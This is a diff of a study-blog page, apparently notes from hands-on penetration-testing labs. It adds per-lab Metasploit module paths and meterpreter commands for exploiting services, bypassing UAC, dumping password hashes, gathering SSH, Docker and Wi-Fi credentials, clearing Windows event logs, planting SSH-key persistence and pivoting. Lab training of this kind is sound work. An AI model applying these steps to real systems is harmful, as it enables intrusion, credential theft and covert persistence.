@@ -60,7 +60,7 @@
   "headline": "Metasploit",
   "description" : "Metasploit",
   "inLanguage" : "en",
-  "wordCount":  79 ,
+  "wordCount":  428 ,
   "datePublished" : "0001-01-01T00:00:00",
   "dateModified" : "0001-01-01T00:00:00",
   "image" : "https:\/\/ctf-journey.github.io\/",
@@ -287,26 +287,131 @@ if (!doNotTrack) {
       <article role="main" class="blog-post">
         <h2 id="metasploit-framework-msf">Metasploit Framework (MSF)</h2>
 <ul>
-<li>windows http file server</li>
-<li>windows java web server</li>
-<li>vulnerable ftp server</li>
-<li>vulnerable file sharing service</li>
-<li>vulnerable ssh server</li>
-<li>vulnerable smtp server</li>
-<li>meterpreter basics</li>
-<li>upgrading shells to meterpreter</li>
-<li>windows post exploitation</li>
-<li>uac bypass, msf memory injection</li>
-<li>exploiting smb with psexec</li>
-<li>windows enable remote desktop</li>
-<li>clearing windows event logs</li>
-<li>pivoting</li>
-<li>post exploitation lab I</li>
-<li>privilege escalation, rootkit scanner</li>
-<li>post exploitation lab II</li>
-<li>establishing persistence on linux</li>
-<li>port scanning and enumeration with armitage</li>
-<li>exploitation and post exploitation with armitage</li>
+<li>windows http file server
+<ul>
+<li>use msf module <code>exploit/windows/http/rejetto_hfs_exec</code></li>
+</ul>
+</li>
+<li>windows java web server
+<ul>
+<li>exploit the tomcat <code>exploit/multi/http/tomcat_jsp_upload_bypass</code></li>
+</ul>
+</li>
+<li>vulnerable ftp server
+<ul>
+<li>vsftpd is backdoored <code>exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+</ul>
+</li>
+<li>vulnerable file sharing service
+<ul>
+<li>exploit the samba server <code>exploit/linux/samba/is_known_pipename</code></li>
+</ul>
+</li>
+<li>vulnerable ssh server
+<ul>
+<li>msf module <code>auxiliary/scanner/ssh/libssh_auth_bypass</code></li>
+</ul>
+</li>
+<li>vulnerable smtp server
+<ul>
+<li>haraka mail server <code>exploit/linux/smtp/haraka</code>, set <code>SRVPORT 9898</code> <code>email_to root@attackdefense.test</code> <code>payload linux/x64/meterpreter_reverse_http</code></li>
+</ul>
+</li>
+<li>meterpreter basics
+<ul>
+<li>check the php file and realise xdebug enabled, use <code>exploit/unix/http/xdebug_unauth_exec</code></li>
+<li>available commands <code>pwd</code> <code>ls</code> <code>lpwd</code> <code>lls</code> <code>edit</code> <code>cat</code> <code>download</code> <code>unzip</code> <code>rm</code> <code>checksum</code> <code>getenv PATH</code> <code>search -d /usr/bin -f *ckdo*</code> <code>lcd</code> <code>upload</code></li>
+</ul>
+</li>
+<li>upgrading shells to meterpreter
+<ul>
+<li>exploit samba again <code>exploit/linux/samba/is_known_pipename</code> to get shell, upgrade to meterpreter with <code>post/multi/manage/shell_to_meterpreter</code></li>
+</ul>
+</li>
+<li>windows post exploitation
+<ul>
+<li>exploit hfs first to get shell <code>exploit/windows/http/rejetto_hfs_exec</code></li>
+<li>post exploitation using <code>post/windows/gather/win_privs</code> <code>post/windows/gather/enum_logged_on_users</code> <code>post/windows/gather/checkvm</code> <code>post/windows/gather/enum_applications</code> <code>post/windows/gather/enum_computers</code> <code>post/windows/gather/enum_shares</code></li>
+</ul>
+</li>
+<li>uac bypass, msf memory injection
+<ul>
+<li>exploit the hsf server <code>exploit/windows/http/rejetto_hfs_exec</code>, migrate to privileged process <code>ps -S explorer.exe</code> <code>migrate 2124</code> <code>getsystem</code></li>
+<li>to use the memory injection, background the session and use <code>exploit/windows/local/bypassuac_injection</code>, migrate again and you can dump hashes <code>ps -S lsass.exe</code> <code>migrate 484</code> <code>hashdump</code></li>
+</ul>
+</li>
+<li>exploiting smb with psexec
+<ul>
+<li>msf module to bruteforce <code>auxiliary/scanner/smb/smb_login</code>, set <code>USER_FILE</code> <code>PASS_FILE</code> <code>RHOSTS</code> and <code>VERBOSE</code></li>
+<li>msf module to gain access <code>exploit/windows/smb/psexec</code>, set <code>RHOSTS</code> <code>SMBUser</code> and <code>SMBPass</code></li>
+</ul>
+</li>
+<li>windows enable remote desktop
+<ul>
+<li>exploit the badblue <code>exploit/windows/http/badblue_passthru</code></li>
+<li>enable the rdp post exploit <code>use post/windows/manage/enable_rdp</code></li>
+</ul>
+</li>
+<li>clearing windows event logs
+<ul>
+<li>its just the <code>clearev</code></li>
+</ul>
+</li>
+<li>pivoting
+<ul>
+<li>exploit the hfs <code>use exploit/windows/http/rejetto_hfs_exec</code>, use the autoroute <code>run autoroute -s 10.0.16.0/20</code></li>
+<li>port forwarding in metasploit with <code>portfwd add -l 1234 -p 80 -r demo2.ine.local</code> and check the list with <code>portfwd list</code></li>
+<li>exploit the badblue on the internal server <code>exploit/windows/http/badblue_passthru</code></li>
+</ul>
+</li>
+<li>linux post exploitation lab I
+<ul>
+<li>exploit using <code>use exploit/linux/samba/is_known_pipename</code></li>
+<li>gather configuration files <code>use post/linux/gather/enum_configs</code></li>
+<li>gather environmental variables <code>use post/multi/gather/env</code></li>
+<li>gather network settings <code>use post/linux/gather/enum_network</code></li>
+<li>check system protections <code>use post/linux/gather/enum_protections</code></li>
+<li>gather system info <code>use post/linux/gather/enum_system</code></li>
+<li>check if inside container <code>use post/linux/gather/checkcontainer</code></li>
+<li>check if inside vm <code>use post/linux/gather/checkvm</code></li>
+<li>check user history <code>use post/linux/gather/enum_users_history</code></li>
+<li>spawn other types of shell <code>use post/multi/manage/system_session</code></li>
+<li>download file using meterpreter <code>use post/linux/manage/download_exec</code></li>
+</ul>
+</li>
+<li>privilege escalation, rootkit scanner
+<ul>
+<li>its a vulnerable rootkit scanner called chkrootkit found using <code>ps -aux</code>, exploit using <code>use exploit/unix/local/chkrootkit</code></li>
+</ul>
+</li>
+<li>linux post exploitation lab II
+<ul>
+<li>gather ssh credentials <code>use post/multi/gather/ssh_creds</code></li>
+<li>gather docker credentials <code>use post/multi/gather/docker_creds</code></li>
+<li>dump hashes <code>use post/linux/gather/hashdump</code></li>
+<li>extract ecrypt folder which may have credentials <code>use post/linux/gather/ecryptfs_creds</code></li>
+<li>extract wifi credentials <code>use post/linux/gather/enum_psk</code></li>
+<li>extract xchat <code>use post/linux/gather/enum_xchat</code></li>
+<li>extract phpmyadmin <code>use post/linux/gather/phpmyadmin_credsteal</code></li>
+<li>extract pptp tunneling protocol using <code>use post/linux/gather/pptpd_chap_secrets</code></li>
+<li>create sshkey backdoor <code>use post/linux/manage/sshkey_persistence</code></li>
+</ul>
+</li>
+<li>establishing persistence on linux
+<ul>
+<li>create sshkey backdoor <code>use post/linux/manage/sshkey_persistence</code></li>
+</ul>
+</li>
+<li>port scanning and enumeration with armitage
+<ul>
+<li>GUI for metasploit, click <code>open shell</code></li>
+</ul>
+</li>
+<li>exploitation and post exploitation with armitage
+<ul>
+<li>GUI for metasploit, open meterpreter and dump hashes</li>
+</ul>
+</li>
 </ul>
 
       </article>
